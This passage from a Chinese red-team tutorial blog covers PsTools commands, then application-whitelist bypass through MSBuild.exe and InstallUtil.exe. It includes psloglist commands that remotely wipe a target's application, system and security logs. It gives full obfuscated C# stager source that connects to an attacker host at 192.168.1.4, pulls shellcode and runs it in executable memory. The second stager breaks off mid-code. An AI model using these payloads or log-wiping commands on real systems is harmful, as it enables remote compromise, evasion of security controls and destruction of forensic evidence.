<strong>其他ps工具介绍：</strong></p>
<p>PSLOGGEDON：查看指定计算机的本地及远程登录的用户和登录时间。必须建立在IP$共享下才可以使用这个工具。</p>
<p>命令如下：</p>
<pre><code class="prism language-c">Psloggedon –l \\<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.3</span>
</code></pre>
<p>PSLOGLIST：事件日志转储及管理。</p>
<p>这个对于渗透测试是非常有用的，它最大的特点就是远程清理系统日志。</p>
<p><strong>常用：</strong></p>
<pre><code class="prism language-c">psloglist \\<span class="token number">72.56</span><span class="token number">.17</span><span class="token number">.74</span> application <span class="token operator">-</span>c <span class="token operator">&gt;</span> nul

psloglist \\<span class="token number">72.56</span><span class="token number">.17</span><span class="token number">.74</span> system <span class="token operator">-</span>c <span class="token operator">&gt;</span> nul

psloglist \\<span class="token number">72.56</span><span class="token number">.17</span><span class="token number">.74</span> security <span class="token operator">-</span>c <span class="token operator">&gt;</span> nul
</code></pre>
<p>分别是清理应用程序日志，系统运行日志，安全日志。</p>
<p>PSSERVICE：管理服务。</p>
<p><strong>常用：</strong></p>
<pre><code class="prism language-c">psservice query messenger
</code></pre>
<p>查询messenger服务的相关信息。</p>
<p>最重要的项目是：服务名称、显示名称、服务描述、服务类型、服务状态。</p>
<pre><code class="prism language-c">psservice config messenger
</code></pre>
<p>查询服务的配置信息。</p>
<p>最重要的项目是：服务名称、服务描述、服务类型、服务启动类型、服务错误控制级别、可执行文件的路径等等。</p>
<p>PSSHUTDOWN：关机工具。</p>
<p>常用命令：</p>
<pre><code class="prism language-c">Psshutdown –s –t <span class="token number">60</span>
</code></pre>
<p>60秒后关机。</p>
<p>下面几个不常用，就介绍下：</p>
<p>PsFile - 显示远程打开的文件</p>
<pre><code class="prism language-c">Psfile \\<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.3</span>
</code></pre>
<p>PsGetSid - 显示计算机或用户的 SID</p>
<pre><code class="prism language-c">Psgetsid \\<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.3</span>
</code></pre>
<p>PsSuspend - 暂停进程</p>
<pre><code class="prism language-c">Pssuspend \\<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.3</span> –u test –p <span class="token number">123456</span> cmd<span class="token punctuation">,</span>exe
</code></pre>
<p>书上的内容更加详细，还介绍了14种工具，应该是最新更新了两种添加进去了…</p>
<hr>
<h2><a id="1012_Netcat_3919"></a>10.12 Netcat使用总结</h2>
<p>前面简单讲解过Netcat使用！！继续在重复复习下吧…</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>freebuf<span class="token punctuation">.</span>com<span class="token operator">/</span>sectool<span class="token operator">/</span><span class="token number">168661.</span>html
</code></pre>
<p>深入的讲解以后会往这框架添加！！</p>
<hr>
<h2><a id="1013_POC_3929"></a>10.13 如何自己动手编写漏洞POC</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>cloud<span class="token punctuation">.</span>tencent<span class="token punctuation">.</span>com<span class="token operator">/</span>developer<span class="token operator">/</span>article<span class="token operator">/</span><span class="token number">1496209</span>
</code></pre>
<p>需要经验累积，自行琢磨吧！！我也差这块的知识脑补！！</p>
<hr>
<h1><a id="_3938"></a>十一、红队技巧</h1>
<h2><a id="111_Msbuildexepayload_3939"></a>11.1 基于白名单Msbuild.exe执行payload（一）</h2>
<p><strong>MSBuild简介：</strong></p>
<p>MSBuild 是 Microsoft Build Engine 的缩写，代表 Microsoft 和 Visual Studio的新的生成平台。MSBuild在如何处理和生成软件方面是完全透明的，使开发人员能够在未安装Visual Studio的生成实验室环境中组织和生成产品。</p>
<p>MSBuild 引入了一种新的基于 XML的项目文件格式，这种格式容易理解、易于扩展并且完全受 Microsoft 支持。MSBuild项目文件的格式使开发人员能够充分描述哪些项需要生成，以及如何利用不同的平台和配置生成这些项。</p>
<p>说明：Msbuild.exe所在路径没有被系统添加PATH环境变量中，因此，Msbuild命令无法识别。</p>
<p><strong>基于白名单MSBuild.exe配置payload：</strong></p>
<p>Windows 7默认位置为：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\msbuild<span class="token punctuation">.</span>exe
</code></pre>
<p>攻击机：192.168.1.4 Debian</p>
<p>靶机： 192.168.1.3 Windows 7</p>
<p><strong>靶机执行：</strong></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\msbuild<span class="token punctuation">.</span>exe Micropoor<span class="token punctuation">.</span>xml
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201009224938763.png#pic_center" alt="在这里插入图片描述"><br>
配置攻击机msf：<br>
<img src="https://img-blog.csdnimg.cn/20201009224949350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
附录：Micropoor.xml<br>
注：x86 payload</p>
<pre><code class="prism language-c"><span class="token operator">&lt;</span>Project ToolsVersion<span class="token operator">=</span><span class="token string">"4.0"</span> xmlns<span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/developer/msbuild/2003"</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">!</span>‐‐ C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\msbuild<span class="token punctuation">.</span>exe SimpleTasks<span class="token punctuation">.</span>csproj Micropoor ‐‐<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>Target Name<span class="token operator">=</span><span class="token string">"iJEKHyTEjyCU"</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>xUokfh <span class="token operator">/</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">/</span>Target<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>UsingTask

TaskName<span class="token operator">=</span><span class="token string">"xUokfh"</span>

TaskFactory<span class="token operator">=</span><span class="token string">"CodeTaskFactory"</span>

AssemblyFile<span class="token operator">=</span><span class="token string">"C:\Windows\Microsoft.Net\Framework\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll"</span> <span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>Task<span class="token operator">&gt;</span> 

<span class="token operator">&lt;</span>Code Type<span class="token operator">=</span><span class="token string">"Class"</span> Language<span class="token operator">=</span><span class="token string">"cs"</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token punctuation">[</span>CDATA<span class="token punctuation">[</span>

using System<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Net<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Linq<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Threading<span class="token punctuation">;</span> using Microsoft<span class="token punctuation">.</span>Build<span class="token punctuation">.</span>Framework<span class="token punctuation">;</span> using Microsoft<span class="token punctuation">.</span>Build<span class="token punctuation">.</span>Utilities<span class="token punctuation">;</span>

public class xUokfh <span class="token punctuation">:</span> Task<span class="token punctuation">,</span> ITask <span class="token punctuation">{</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span>UInt32 ogephG<span class="token punctuation">,</span>UInt32 fZZrvQ<span class="token punctuation">,</span> UInt32 nDfrBaiPvDyeP<span class="token punctuation">,</span> UInt32 LWITkrW<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>private <span class="token keyword">static</span> <span class="token keyword">extern</span> IntPtr <span class="token function">CreateThread</span><span class="token punctuation">(</span>UInt32 qEVoJxknom<span class="token punctuation">,</span> UInt32 gZyJBJWYQsnXkWe<span class="token punctuation">,</span> UInt32 jyIPELfKQYEVZM<span class="token punctuation">,</span>IntPtr adztSHGJiurGO<span class="token punctuation">,</span> UInt32 vjSCprCJ<span class="token punctuation">,</span> ref UInt32 KbPukprMQXUp<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>IntPtr wVCIQGmqjONiM<span class="token punctuation">,</span> UInt32 DFgVrE<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">static</span> byte<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">VYcZlUehuq</span><span class="token punctuation">(</span>string IJBRrBqhigjGAx<span class="token punctuation">,</span> <span class="token keyword">int</span> XBUCexXIrGIEpe<span class="token punctuation">)</span> <span class="token punctuation">{</span>

IPEndPoint DRHsPzS <span class="token operator">=</span> new <span class="token function">IPEndPoint</span><span class="token punctuation">(</span>IPAddress<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>IJBRrBqhigjGAx<span class="token punctuation">)</span><span class="token punctuation">,</span> XBUCexXIrGIEpe<span class="token punctuation">)</span><span class="token punctuation">;</span>

Socket zCoDOd <span class="token operator">=</span> new <span class="token function">Socket</span><span class="token punctuation">(</span>AddressFamily<span class="token punctuation">.</span>InterNetwork<span class="token punctuation">,</span> SocketType<span class="token punctuation">.</span>Stream<span class="token punctuation">,</span> ProtocolType<span class="token punctuation">.</span>Tcp<span class="token punctuation">)</span><span class="token punctuation">;</span>

try <span class="token punctuation">{</span> zCoDOd<span class="token punctuation">.</span><span class="token function">Connect</span><span class="token punctuation">(</span>DRHsPzS<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

catch <span class="token punctuation">{</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span><span class="token punctuation">}</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> OCrGofbbWRVsFEl <span class="token operator">=</span> new byte<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

zCoDOd<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span>OCrGofbbWRVsFEl<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> auQJTjyxYw <span class="token operator">=</span> BitConverter<span class="token punctuation">.</span><span class="token function">ToInt32</span><span class="token punctuation">(</span>OCrGofbbWRVsFEl<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> MlhacMDOKUAfvMX <span class="token operator">=</span> new byte<span class="token punctuation">[</span>auQJTjyxYw <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> GFtbdD <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token keyword">while</span> <span class="token punctuation">(</span>GFtbdD <span class="token operator">&lt;</span> auQJTjyxYw<span class="token punctuation">)</span>

<span class="token punctuation">{</span> GFtbdD <span class="token operator">+</span><span class="token operator">=</span> zCoDOd<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span>MlhacMDOKUAfvMX<span class="token punctuation">,</span> GFtbdD <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>auQJTjyxYw ‐ GFtbdD<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4096</span> <span class="token operator">?</span> <span class="token punctuation">(</span>auQJTjyxYw ‐ GFtbdD<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">4096</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> YqBRpsmDUT <span class="token operator">=</span> BitConverter<span class="token punctuation">.</span><span class="token function">GetBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>zCoDOd<span class="token punctuation">.</span>Handle<span class="token punctuation">)</span><span class="token punctuation">;</span>

Array<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>YqBRpsmDUT<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MlhacMDOKUAfvMX<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> MlhacMDOKUAfvMX<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xBF</span><span class="token punctuation">;</span>

<span class="token keyword">return</span> MlhacMDOKUAfvMX<span class="token punctuation">;</span><span class="token punctuation">}</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">NkoqFHncrcX</span><span class="token punctuation">(</span>byte<span class="token punctuation">[</span><span class="token punctuation">]</span> qLAvbAtan<span class="token punctuation">)</span> <span class="token punctuation">{</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>qLAvbAtan <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>

UInt32 jrYMBRkOAnqTqx <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>qLAvbAtan<span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

Marshal<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>qLAvbAtan<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>IntPtr<span class="token punctuation">)</span><span class="token punctuation">(</span>jrYMBRkOAnqTqx<span class="token punctuation">)</span><span class="token punctuation">,</span> qLAvbAtan<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>

IntPtr WCUZoviZi <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">;</span>

UInt32 JhtJOypMKo <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

IntPtr UxebOmhhPw <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">;</span>

WCUZoviZi <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> jrYMBRkOAnqTqx<span class="token punctuation">,</span> UxebOmhhPw<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ref JhtJOypMKo<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>WCUZoviZi<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span> 

public override bool <span class="token function">Execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> uABVbNXmhr <span class="token operator">=</span> null<span class="token punctuation">;</span> uABVbNXmhr <span class="token operator">=</span> <span class="token function">VYcZlUehuq</span><span class="token punctuation">(</span><span class="token string">"192.168.1.4"</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">NkoqFHncrcX</span><span class="token punctuation">(</span>uABVbNXmhr<span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token keyword">return</span> true<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span>

<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">/</span>Code<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">/</span>Task<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">/</span>UsingTask<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">/</span>Project<span class="token operator">&gt;</span>
</code></pre>
<hr>
<h2><a id="112_Installutilexepayload_4077"></a>11.2 基于白名单Installutil.exe执行payload（二）</h2>
<p><strong>Installutil简介：</strong></p>
<p>Installer工具是一个命令行实用程序，允许您通过执行指定程序集中的安装程序组件来安装和卸载服务器资源。此工具与System.Configuration.Install命名空间中的类一起使用。</p>
<p>具体参考：Windows Installer部署</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>docs<span class="token punctuation">.</span>microsoft<span class="token punctuation">.</span>com<span class="token operator">/</span>zh<span class="token operator">-</span>cn<span class="token operator">/</span>previous<span class="token operator">-</span>versions<span class="token operator">/</span><span class="token function">2kt85ked</span><span class="token punctuation">(</span>v<span class="token operator">=</span>vs<span class="token punctuation">.</span><span class="token number">120</span><span class="token punctuation">)</span>
</code></pre>
<p>说明：Installutil.exe所在路径没有被系统添加PATH环境变量中，因此，Installutil命令无法识别。</p>
<p>基于白名单installutil.exe配置payload：</p>
<p>Windows 7 默认位置：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\InstallUtil<span class="token punctuation">.</span>exe
</code></pre>
<p>攻击机：192.168.1.4 Debian</p>
<p>靶机：192.168.1.3 Windows 7</p>
<p><strong>配置攻击机msf：</strong><br>
<img src="https://img-blog.csdnimg.cn/20201009225308205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>靶机执行：</strong></p>
<p><strong>靶机编译：</strong></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework64\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\csc<span class="token punctuation">.</span>exe <span class="token operator">/</span>r<span class="token punctuation">:</span>System<span class="token punctuation">.</span>Ente rpriseServices<span class="token punctuation">.</span>dll <span class="token operator">/</span>r<span class="token punctuation">:</span>System<span class="token punctuation">.</span>IO<span class="token punctuation">.</span>Compression<span class="token punctuation">.</span>dll <span class="token operator">/</span>target<span class="token punctuation">:</span>library <span class="token operator">/</span>out<span class="token punctuation">:</span>Mic opoor<span class="token punctuation">.</span>exe <span class="token operator">/</span>keyfile<span class="token punctuation">:</span>C<span class="token punctuation">:</span>\Users\John\Desktop\installutil<span class="token punctuation">.</span>snk <span class="token operator">/</span>unsafe C<span class="token punctuation">:</span>\Users\John\Desktop\installutil<span class="token punctuation">.</span>cs
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020100922532952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>payload：</strong></p>
<p>Micropoor.exe<br>
<img src="https://img-blog.csdnimg.cn/20201009225344271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>靶机执行：</strong></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\Microsoft<span class="token punctuation">.</span>NET\Framework64\v4<span class="token punctuation">.</span><span class="token number">0.30319</span>\InstallUtil<span class="token punctuation">.</span>exe <span class="token operator">/</span>logfile<span class="token operator">=</span> <span class="token operator">/</span>LogToConsole<span class="token operator">=</span>false <span class="token operator">/</span>U Micropoor<span class="token punctuation">.</span>exe
</code></pre>
<p><strong>附录：Micropoor.cs</strong></p>
<p>注：x64 payload<br>
<img src="https://img-blog.csdnimg.cn/20201009225410873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">using System<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Net<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Linq<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Threading<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Configuration<span class="token punctuation">.</span>Install<span class="token punctuation">;</span> using System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span>

public class GQLBigHgUniLuVx <span class="token punctuation">{</span>

public <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>

<span class="token keyword">while</span><span class="token punctuation">(</span>true<span class="token punctuation">)</span>

<span class="token punctuation">{</span><span class="token punctuation">{</span> MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token string">"doge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> Console<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token punctuation">}</span> 

<span class="token punctuation">[</span>System<span class="token punctuation">.</span>ComponentModel<span class="token punctuation">.</span><span class="token function">RunInstaller</span><span class="token punctuation">(</span>true<span class="token punctuation">)</span><span class="token punctuation">]</span>

public class esxWUYUTWShqW <span class="token punctuation">:</span> System<span class="token punctuation">.</span>Configuration<span class="token punctuation">.</span>Install<span class="token punctuation">.</span>Installer

<span class="token punctuation">{</span>

public override <span class="token keyword">void</span> <span class="token function">Uninstall</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span>Collections<span class="token punctuation">.</span>IDictionary zWrdFAUHmunnu<span class="token punctuation">)</span>

<span class="token punctuation">{</span>

jkmhGrfzsKQeCG<span class="token punctuation">.</span><span class="token function">LCIUtRN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token punctuation">}</span> 

public class jkmhGrfzsKQeCG

<span class="token punctuation">{</span> <span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span>UInt32 YUtHhF<span class="token punctuation">,</span>UInt32 VenifEUR<span class="token punctuation">,</span> UInt32 NIHbxnOmrgiBGL<span class="token punctuation">,</span> UInt32 KIheHEUxhAfOI<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>private <span class="token keyword">static</span> <span class="token keyword">extern</span> IntPtr <span class="token function">CreateThread</span><span class="token punctuation">(</span>UInt32 GDmElasSZbx<span class="token punctuation">,</span> UInt32 rGECFEZG<span class="token punctuation">,</span> UInt32 UyBSrAIp<span class="token punctuation">,</span>IntPtr sPEeJlufmodo<span class="token punctuation">,</span> UInt32 jmzHRQU<span class="token punctuation">,</span> ref UInt32 SnpQPGMvDbMOGmn<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>IntPtr pRIwbzTTS<span class="token punctuation">,</span> UInt32 eRLAWWYQnq<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">static</span> byte<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">ErlgHH</span><span class="token punctuation">(</span>string ZwznjBJY<span class="token punctuation">,</span> <span class="token keyword">int</span> KsMEeo<span class="token punctuation">)</span> <span class="token punctuation">{</span>

IPEndPoint qAmSXHOKCbGlysd <span class="token operator">=</span> new <span class="token function">IPEndPoint</span><span class="token punctuation">(</span>IPAddress<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>ZwznjBJY<span class="token punctuation">)</span><span class="token punctuation">,</span> KsMEeo<span class="token punctuation">)</span><span class="token punctuation">;</span>

Socket XXxIoIXNCle <span class="token operator">=</span> new <span class="token function">Socket</span><span class="token punctuation">(</span>AddressFamily<span class="token punctuation">.</span>InterNetwork<span class="token punctuation">,</span> SocketType<span class="token punctuation">.</span>Stream<span class="token punctuation">,</span> ProtocolType<span class="token punctuation">.</span>Tcp<span class="token punctuation">)</span><span class="token punctuation">;</span>

try <span class="token punctuation">{</span> XXxIoIXNCle<span class="token punctuation">.</span><span class="token function">Connect</span><span class="token punctuation">(</span>qAmSXHOKCbGlysd<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

catch <span class="token punctuation">{</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span><span class="token punctuation">}</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> UmquAHRnhhpuE <span class="token operator">=</span> new byte<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

XXxIoIXNCle<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span>UmquAHRnhhpuE<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> kFVRSNnpj <span class="token operator">=</span> BitConverter<span class="token punctuation">.</span><span class="token function">ToInt32</span><span class="token punctuation">(</span>UmquAHRnhhpuE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> qaYyFq <span class="token operator">=</span> new byte<span class="token punctuation">[</span>kFVRSNnpj <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> SRCDELibA <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token keyword">while</span> <span class="token punctuation">(</span>SRCDELibA <span class="token operator">&lt;</span> kFVRSNnpj<span class="token punctuation">)</span>

<span class="token punctuation">{</span> SRCDELibA <span class="token operator">+</span><span class="token operator">=</span> XXxIoIXNCle<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span>qaYyFq<span class="token punctuation">,</span> SRCDELibA <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>kFVRSNnpj ‐ SRCDELibA<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4096</span> <span class="token operator">?</span> <span class="token punctuation">(</span>kFVRSNnpj ‐ SRCDELibA<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">4096</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> TvvzOgPLqwcFFv <span class="token operator">=</span> BitConverter<span class="token punctuation">.</span><span class="token function">GetBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>XXxIoIXNCle<span class="token punctuation">.</span>Handle<span class="token punctuation">)</span><span class="token punctuation">;</span>

Array<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>TvvzOgPLqwcFFv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> qaYyFq<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> qaYyFq<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xBF</span><span class="token punctuation">;</span>

